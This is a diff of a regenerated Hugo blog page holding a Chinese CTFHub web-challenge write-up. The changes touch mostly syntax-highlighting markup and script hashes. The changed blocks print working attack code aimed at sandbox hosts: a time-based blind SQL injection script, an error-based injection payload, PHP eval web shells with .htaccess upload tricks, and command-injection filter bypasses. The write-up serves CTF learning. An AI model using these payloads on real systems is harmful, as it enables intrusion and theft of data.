@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.498676c34eb225e85357ab0ce19c3c1244f3bd0bf595e5684d1b9d50ea4fbc42.js"></script>
 
-<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
+<script defer src="/js/helper/getParents.min.cd44056d552c69703dced61ae60f99166a0ddf44be93d6aa5d5127d98bf98984.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.1d13d3e810c3940e80cbba6216a1c76fbf42b5431fc83537ea6997863802362b.js"></script>
+<script defer src="/js/helper/fadeinout.min.1551b6dbdacc77e412a26a29d3b84d2dcdc8f05c3b617433a475dc53c8872bdb.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1349,7 +1349,7 @@
 <meta property="og:type" content="article">
 <meta property="og:description" content="">
 
-<meta name="generator" content="Hugo 0.92.0" />
+<meta name="generator" content="Hugo 0.94.0" />
 <meta name="msapplication-TileColor" content="#fff">
 
 <meta name="theme-color" content="#fff">
@@ -1763,19 +1763,19 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
-<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://challenge-c93f188d4781b829.sandbox.ctfhub.com:10080/&#34;</span>
-<span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;web&#39;</span><span class="p">,</span><span class="s1">&#39;website&#39;</span><span class="p">,</span><span class="s1">&#39;backup&#39;</span><span class="p">,</span><span class="s1">&#39;back&#39;</span><span class="p">,</span><span class="s1">&#39;www&#39;</span><span class="p">,</span><span class="s1">&#39;wwwroot&#39;</span><span class="p">,</span><span class="s1">&#39;temp&#39;</span><span class="p">]</span>
-<span class="n">b</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tar&#39;</span><span class="p">,</span><span class="s1">&#39;tar.gz&#39;</span><span class="p">,</span><span class="s1">&#39;zip&#39;</span><span class="p">,</span><span class="s1">&#39;rar&#39;</span><span class="p">]</span>
-
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">a</span><span class="p">:</span>
-	<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">b</span><span class="p">:</span>
-		<span class="n">pos</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">j</span>
-		<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">pos</span><span class="p">)</span>
-		<span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-		<span class="nb">print</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
-		<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://challenge-c93f188d4781b829.sandbox.ctfhub.com:10080/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;web&#39;</span><span class="p">,</span><span class="s1">&#39;website&#39;</span><span class="p">,</span><span class="s1">&#39;backup&#39;</span><span class="p">,</span><span class="s1">&#39;back&#39;</span><span class="p">,</span><span class="s1">&#39;www&#39;</span><span class="p">,</span><span class="s1">&#39;wwwroot&#39;</span><span class="p">,</span><span class="s1">&#39;temp&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tar&#39;</span><span class="p">,</span><span class="s1">&#39;tar.gz&#39;</span><span class="p">,</span><span class="s1">&#39;zip&#39;</span><span class="p">,</span><span class="s1">&#39;rar&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">a</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">b</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">pos</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">j</span>
+</span></span><span class="line"><span class="cl">		<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">pos</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>获得源码解压后有个 flag.txt 但是里面不是flag 还有个奇怪的 50x.html 尝试直接访问这个奇怪的 html 没用 直接访问这个 flag.txt 就出了<br />
 <img src="https://img-blog.csdnimg.cn/20200318235302511.png" alt="" /></p>
@@ -1837,9 +1837,9 @@ git show stash@{n}	#当有多条记录并且过了一段时间忘记stash内容�
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#一定要加 -v 不然 down 不下来的</span>
-./rip-hg.pl -v -u http://challenge-365f72206c2c35b5.sandbox.ctfhub.com:10080/.hg/
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#一定要加 -v 不然 down 不下来的</span>
+</span></span><span class="line"><span class="cl">./rip-hg.pl -v -u http://challenge-365f72206c2c35b5.sandbox.ctfhub.com:10080/.hg/
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后就是文件夹里一顿疯找 但是什么都找不到 但是很多个文件 里面都有关于 flag.txt 的<br />
 <img src="https://img-blog.csdnimg.cn/20200319014447320.png" alt="" /><br />
@@ -1886,8 +1886,8 @@ git show stash@{n}	#当有多条记录并且过了一段时间忘记stash内容�
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="m">1</span> Union <span class="k">select</span> count<span class="o">(</span>*<span class="o">)</span>,concat<span class="o">(</span>database<span class="o">()</span>,0x26,floor<span class="o">(</span>rand<span class="o">(</span>0<span class="o">)</span>*2<span class="o">))</span>x from information_schema.columns group by x<span class="p">;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="m">1</span> Union <span class="k">select</span> count<span class="o">(</span>*<span class="o">)</span>,concat<span class="o">(</span>database<span class="o">()</span>,0x26,floor<span class="o">(</span>rand<span class="o">(</span>0<span class="o">)</span>*2<span class="o">))</span>x from information_schema.columns group by x<span class="p">;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="时间盲注">时间盲注</h4>
 <p><a href="https://www.cnblogs.com/backlion/p/9721693.html">学习的话可以参考这个</a><br />
@@ -1931,36 +1931,36 @@ git show stash@{n}	#当有多条记录并且过了一段时间忘记stash内容�
 </span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1">#写脚本水平很低 大神不要喷哈</span>
-<span class="c1">#使用的话只要稍微改几个参数就行了</span>
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">time</span>
-
-<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://challenge-9514b2cf659c25a1.sandbox.ctfhub.com:10080/?id=&#34;</span>
-<span class="n">des</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-
-<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">):</span>
-	<span class="nb">print</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
-	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">60</span><span class="p">):</span>
-		<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz}{0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">:</span>
-			<span class="c1"># 数据库</span>
-			<span class="c1"># sql = &#34;if(substr(database(),%d,1)=&#39;%s&#39;,sleep(1),1) #&#34; %(i,j)</span>
-			<span class="c1"># 数据表</span>
-			<span class="c1"># sql = &#34;if(substr((select table_name from information_schema.tables where table_schema=&#39;sqli&#39; limit %d,1),%d,1) = &#39;%s&#39;,sleep(1),1)&#34; %(k,i,j)</span>
-			<span class="c1"># 字段</span>
-			<span class="c1"># sql = &#34;if(substr((select column_name from information_schema.columns where table_name=&#39;flag&#39; and table_schema=&#39;sqli&#39;),%d,1) = &#39;%s&#39;,sleep(1),1)&#34; %(i,j)</span>
-			<span class="c1"># 字段内容</span>
-			<span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;if(substr((select flag from sqli.flag),</span><span class="si">%d</span><span class="s2">,1) = &#39;</span><span class="si">%s</span><span class="s2">&#39;,sleep(1),1)&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
-			<span class="n">t1</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
-			<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">sql</span><span class="p">)</span>
-			<span class="n">t2</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
-			<span class="k">if</span><span class="p">(</span><span class="n">t2</span><span class="o">-</span><span class="n">t1</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">):</span>
-				<span class="n">des</span> <span class="o">+=</span> <span class="n">j</span>
-				<span class="nb">print</span><span class="p">(</span><span class="n">des</span><span class="p">)</span>
-				<span class="k">break</span>
-	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;des:&#34;</span> <span class="o">+</span> <span class="n">des</span><span class="p">)</span>
-	<span class="n">des</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#写脚本水平很低 大神不要喷哈</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#使用的话只要稍微改几个参数就行了</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://challenge-9514b2cf659c25a1.sandbox.ctfhub.com:10080/?id=&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">des</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">60</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz}{0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="c1"># 数据库</span>
+</span></span><span class="line"><span class="cl">			<span class="c1"># sql = &#34;if(substr(database(),%d,1)=&#39;%s&#39;,sleep(1),1) #&#34; %(i,j)</span>
+</span></span><span class="line"><span class="cl">			<span class="c1"># 数据表</span>
+</span></span><span class="line"><span class="cl">			<span class="c1"># sql = &#34;if(substr((select table_name from information_schema.tables where table_schema=&#39;sqli&#39; limit %d,1),%d,1) = &#39;%s&#39;,sleep(1),1)&#34; %(k,i,j)</span>
+</span></span><span class="line"><span class="cl">			<span class="c1"># 字段</span>
+</span></span><span class="line"><span class="cl">			<span class="c1"># sql = &#34;if(substr((select column_name from information_schema.columns where table_name=&#39;flag&#39; and table_schema=&#39;sqli&#39;),%d,1) = &#39;%s&#39;,sleep(1),1)&#34; %(i,j)</span>
+</span></span><span class="line"><span class="cl">			<span class="c1"># 字段内容</span>
+</span></span><span class="line"><span class="cl">			<span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;if(substr((select flag from sqli.flag),</span><span class="si">%d</span><span class="s2">,1) = &#39;</span><span class="si">%s</span><span class="s2">&#39;,sleep(1),1)&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="n">t1</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">			<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">sql</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="n">t2</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="n">t2</span><span class="o">-</span><span class="n">t1</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">				<span class="n">des</span> <span class="o">+=</span> <span class="n">j</span>
+</span></span><span class="line"><span class="cl">				<span class="nb">print</span><span class="p">(</span><span class="n">des</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="k">break</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;des:&#34;</span> <span class="o">+</span> <span class="n">des</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">des</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="mysql结构">MySQL结构</h4>
 <p>就是普通手注就行&hellip;&hellip;.为啥它放这么下面&hellip;&hellip;.不想写了<br />
@@ -2067,7 +2067,7 @@ ctfhub{5cca896d0b05a1eb8977197827b33b57df87aacb}</p>
 <p>.htaccess 利用方法 <a href="https://www.jianshu.com/p/c674904a711e">参考博文</a></p>
 <p>法一</p>
 <pre tabindex="0"><code># FileMatch 参数即为文件名的正则匹配
-&lt;FilesMatch &quot;sniperoj&quot;&gt;
+&lt;FilesMatch &#34;sniperoj&#34;&gt;
   SetHandler application/x-httpd-php
 &lt;/FilesMatch&gt;
 </code></pre><div class="highlight"><div class="chroma">
@@ -2075,8 +2075,8 @@ ctfhub{5cca896d0b05a1eb8977197827b33b57df87aacb}</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>法二</p>
 <pre tabindex="0"><code>AddType application/x-httpd-php .jpg
@@ -2085,8 +2085,8 @@ ctfhub{5cca896d0b05a1eb8977197827b33b57df87aacb}</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ma&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ma&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>写个 .htaccess 文件 写个 马 后缀改 jpg(你允许的后缀) 然后上传蚁剑连一下就行了</p>
 <p><img src="https://img-blog.csdnimg.cn/202003202209311.png" alt="" /></p>
@@ -2142,7 +2142,7 @@ cat${IFS}flag.txt
 cat$IFS$9flag.txt
 cat&lt;flag.txt
 cat&lt;&gt;flag.txt
-kg=$'\x20flag.txt'&amp;&amp;cat$kg
+kg=$&#39;\x20flag.txt&#39;&amp;&amp;cat$kg
 (\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)
 </code></pre><p>这道题目差点让我自闭</p>
 <div class="highlight"><div class="chroma">
@@ -2154,12 +2154,12 @@ kg=$'\x20flag.txt'&amp;&amp;cat$kg
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#列一下目录</span>
-<span class="c1">#这里&amp;&amp; 和 || 都可以 照理说 || 是不行的 应该用 &amp;&amp; </span>
-127.0.0.1<span class="o">||</span>ls
-<span class="c1">#cat一下 flagxxxx.php</span>
-127.0.0.1<span class="o">||</span>cat&lt;flagxxxx.php
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#列一下目录</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#这里&amp;&amp; 和 || 都可以 照理说 || 是不行的 应该用 &amp;&amp; </span>
+</span></span><span class="line"><span class="cl">127.0.0.1<span class="o">||</span>ls
+</span></span><span class="line"><span class="cl"><span class="c1">#cat一下 flagxxxx.php</span>
+</span></span><span class="line"><span class="cl">127.0.0.1<span class="o">||</span>cat&lt;flagxxxx.php
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img src="https://img-blog.csdnimg.cn/20200323235306934.png" alt="" /><br />
 然后我一直自闭在这里明明没有空格 他也正常执行了 为什么返回一个空行呢</p>
@@ -2198,8 +2198,8 @@ kg=$'\x20flag.txt'&amp;&amp;cat$kg
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">%0Als<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span><span class="k">$(</span>printf<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>%22<span class="se">\x</span>66<span class="se">\x</span>6C<span class="se">\x</span>61<span class="se">\x</span>67<span class="se">\x</span>5F<span class="se">\x</span>69<span class="se">\x</span>73<span class="se">\x</span>5F<span class="se">\x</span>68<span class="se">\x</span>65<span class="se">\x</span>72<span class="se">\x</span>65%22<span class="k">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%0Als<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span><span class="k">$(</span>printf<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>%22<span class="se">\x</span>66<span class="se">\x</span>6C<span class="se">\x</span>61<span class="se">\x</span>67<span class="se">\x</span>5F<span class="se">\x</span>69<span class="se">\x</span>73<span class="se">\x</span>5F<span class="se">\x</span>68<span class="se">\x</span>65<span class="se">\x</span>72<span class="se">\x</span>65%22<span class="k">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这么长要一个一个转化为十六进制 然后手差点断掉。。。</p>
 <p><img src="https://img-blog.csdnimg.cn/20200324005329854.png" alt="" /></p>
@@ -2208,8 +2208,8 @@ kg=$'\x20flag.txt'&amp;&amp;cat$kg
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">%0Aca%27%27t<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span><span class="k">$(</span>printf<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span><span class="s2">&#34;\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65\x2f\x66\x6c\x61\x67\x5f\x33\x32\x31\x30\x38\x36\x39\x39\x31\x33\x30\x34\x30\x32\x2e\x70\x68\x70&#34;</span><span class="k">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%0Aca%27%27t<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span><span class="k">$(</span>printf<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span><span class="s2">&#34;\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65\x2f\x66\x6c\x61\x67\x5f\x33\x32\x31\x30\x38\x36\x39\x39\x31\x33\x30\x34\x30\x32\x2e\x70\x68\x70&#34;</span><span class="k">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>上面的全部原理都在下面这张图中</p>
 <p><img src="https://img-blog.csdnimg.cn/20200324011729110.png" alt="" /></p>
@@ -2594,7 +2594,7 @@ kg=$'\x20flag.txt'&amp;&amp;cat$kg
 </div>
 
 
-<script defer src="/js/swipe.min.d2e020e2d405fafaa45c0a10d2af949627bf554a9366c31a905af38f8cc30c30.js"></script>
+<script defer src="/js/swipe.min.32b4505a39624feed6faa09f12dd745a099b8811ea631c29cea9692c45984af8.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
